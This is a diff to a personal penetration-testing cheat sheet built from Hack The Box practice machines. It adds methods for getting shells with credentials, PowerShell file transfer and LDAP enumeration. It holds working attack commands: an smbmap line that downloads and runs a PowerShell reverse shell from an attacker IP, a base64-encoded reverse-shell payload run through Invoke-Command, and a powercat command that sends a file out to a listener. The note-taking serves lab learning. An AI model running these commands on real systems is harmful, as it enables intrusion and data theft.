@@ -16,10 +16,28 @@
 	2.12  [Get a Reverse shell using `smbmap`. Make sure python server and nc listener is running.](#Get%20a%20Reverse%20shell%20using%20`smbmap`.%20Make%20sure%20python%20server%20and%20nc%20listener%20is%20running.)
 3.  [Nmap](#Nmap)
 4.  [CURL](#CURL)
+	1. [Download the file on the target.](#Download%20the%20file%20on%20the%20target.)
 5. [Ways to Get The Shell](#Ways%20to%20Get%20The%20Shell)
-	5.1  [RCE to Shell](#RCE%20to%20Shell)
-	5.2  [Getting Shell When you have password](#Getting%20Shell%20When%20you%20have%20password)
+	1. [RCE to Shell](#RCE%20to%20Shell)
+	2. [Getting Shell When you have password](#Getting%20Shell%20When%20you%20have%20password)
+	3. [`Using impacket-wmiexec`](#`Using%20impacket-wmiexec`)
+	4. [`Using smbclient`](#`Using%20smbclient`)
+	5. [`Using Telnet`](#`Using%20Telnet`)
+	6. [`Using smbmap to run powershell command`](#`Using%20smbmap%20to%20run%20powershell%20command`)
+	7. [`using rpcclient`](#`using%20rpcclient`)
+	8. [`Using PowerShell`](#`Using%20PowerShell`)
+	9. [`Print File Content using SQL Query (MYSQL)`](#`Print%20File%20Content%20using%20SQL%20Query%20(MYSQL)`)
 6.  [PowerShell & Active Directory](#PowerShell%20&%20Active%20Directory)
+	1. [`Print all the environment variables using powershell`.](#`Print%20all%20the%20environment%20variables%20using%20powershell`.)
+	2. [`Importing PowerSploit and Other modules`](#`Importing%20PowerSploit%20and%20Other%20modules`)
+	3. [`Copy the whole PowerSploit Directory as follows`](#`Copy%20the%20whole%20PowerSploit%20Directory%20as%20follows`)
+	4. [`Checking the PowerShell history`](#`Checking%20the%20PowerShell%20history`)
+	5. [`File Transfer Using PowerShell`](#`File%20Transfer%20Using%20PowerShell`)
+7. [LDAP or WinDapSearch](#LDAP%20or%20WinDapSearch)
+	1. [`Anonymous Bind`](#`Anonymous%20Bind`)
+	2. [`Authenticated Bind`](#`Authenticated%20Bind`)
+	3. [`Get Specific User`](#`Get%20Specific%20User`)
+	4. [`LDAP With Credentials Enumeration`](#`LDAP%20With%20Credentials%20Enumeration`)
 ### Links
 
 [LZone Cheat Sheet](https://lzone.de/#/LZone%20Cheat%20Sheets)  - Someone Name Lzone prepare a nice checklist on Docker container, CI/CD and various other things. Good One to check out
@@ -109,7 +127,7 @@ Ongoing notes...Will add things later as I found during HTB machines
 
 ### CURL 
 
-To Download the file on the target.
+###### Download the file on the target.
 ```
 Start the Python Server on Kali
 python -m http.server 80
@@ -146,7 +164,7 @@ $ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10
 
 During Privilege Escalation for the Remote.HTB, I got the Administrator Credentials but getting shell was something i spent my time on. So here are few ways to get a direct shell if you have a credentials.
 
-`Using impacket-wmiexec`
+###### `Using impacket-wmiexec`
 ```
 $ impacket-wmiexec 'Administrator:!R3m0te!@10.10.10.180'                      
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
@@ -158,35 +176,50 @@ C:\>whoami
 remote\administrator
 ```
 
-`Using smbclient`
+###### `Using smbclient`
 ```
 $ smbclient -U Administrator \\\\10.10.10.180\\C$
 Password for [WORKGROUP\Administrator]:!R3m0te!    # Provide the Admin Password Here
 ```
 
-`Using Telnet`
+###### `Using Telnet`
 ```
 $ telnet access.htb
 C:\Users\security>
 ```
 
-`Using smbmap to run powershell command`
+###### `Using smbmap to run powershell command`
 ```
 # smbmap -u 'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -x 'powershell iex (New-Object Net.WebClient).DownloadString("http://10.10.14.2/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444' -H 10.10.10.178
 ```
 
-`using rpcclient`
+###### `using rpcclient`
 ```
 # rpcclient -U 'bhult%Fabricorp012' 10.10.10.193
 ```
+
+###### `Using PowerShell`
+```
+$PSW = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
+$LOGIN = New-Object System.Management.Automation.PSCredential('Scrm\MiscSvc',$PSW)
+
+#Now Use revshell.com and Generate PowerShell V3 (Base64)
+
+Invoke-Command -Computer dc1 -Credential $LOGIN -ScriptBlock {powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=}
+```
+
+###### `Print File Content using SQL Query (MYSQL)`
+```
+SELECT BulkColumn FROM OPENROWSET(BULK 'C:\users\miscsvc\desktop\user.txt', SINGLE_CLOB) MyFile
+```
 ### PowerShell & Active Directory
 
-##### Print all the environment variables using powershell.
+###### `Print all the environment variables using powershell`.
 ```
 Get-ChildItem env:
 ```
 
-Importing PowerSploit and Other modules 
+###### `Importing PowerSploit and Other modules` 
 ```
 *Evil-WinRM* PS C:\Program Files\WindowsPowerShell\Modules\PowerSploit> Import-Module PowerSploit\Recon
 *Evil-WinRM* PS C:\Program Files\WindowsPowerShell\Modules\PowerSploit> Import-Module PowerSploit\Privesc
@@ -195,18 +228,46 @@ Note that I am inside the PowerSploit directory where Recon and Privesc director
 
 ```
 *Evil-WinRM* PS C:\Program Files\WindowsPowerShell\Modules\PowerSploit> Get-Command -Module Recon
-
 CommandType     Name                                               Version    Source
 -----------     ----                                               -------    ------
 Function        Add-NetUser                                        3.0.0.0    Recon
 ```
 
-Copy the whole PowerSploit Directory as follows
+###### `Copy the whole PowerSploit Directory as follows`
 ```
 *Evil-WinRM* PS C:\tmp\PowerSploit> Copy-Item PowerSploit "C:\Program Files\WindowsPowerShell\Modules" -recurse -Force
 ```
 
-Checking the PowerShell history
+###### `Checking the PowerShell history`
 ```
 *Evil-WinRM* PS C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
+```
+
+###### `File Transfer Using PowerShell`
+```
+PS C:\ProgramData> curl -o powercat.ps1 http://10.10.14.2/powercat.ps1
+PS C:\ProgramData> powercat -c 10.10.14.2 -p 1234 -i "C:\Shares\IT\Apps\Sales Order Client\ScrambleClient.exe" 
+#Start the NetCat Listener using nc -l -p 1234 > FileName.exe
+```
+### LDAP or WinDapSearch
+
+Alternate tool: [WinDapSearch](https://github.com/ropnop/windapsearch)
+###### `Anonymous Bind`
+```
+ldapsearch -H ldap://athos.host -x -LLL
+ldapsearch -H ldap://athos.host -x -LLL -b '' -s base namingContexts
+ldapsearch -H ldap://athos.host -x -LLL -b 'dc=athos,dc=host' 'dn'
+```
+###### `Authenticated Bind`
+```
+ldapsearch -H ldap://athos.host -D 'cn=admin,dc=athos,dc=host' -w 'p@ssw0rd' -x -LLL -b 'dc=athos,dc=host' 'dn'
+ldapsearch -H ldap://athos.host -D 'cn=admin,dc=athos,dc=host' -w 'p@ssw0rd' -x -LLL -b 'dc=athos,dc=host' 'dn'
+```
+###### `Get Specific User`
+```
+ldapsearch -xLLL -H ldaps://<ldap server> -b 'ou=People,dc=metricinsights,dc=com' '(uid=testuser1)' 
+```
+###### `LDAP With Credentials Enumeration`
+```
+ldapsearch -xLLL -H ldaps://<ldap server> -D '<ldap credentials username>' -W -b 'CN=Users,DC=metricinsights,DC=com' 'samaccountname=tester1'
 ```
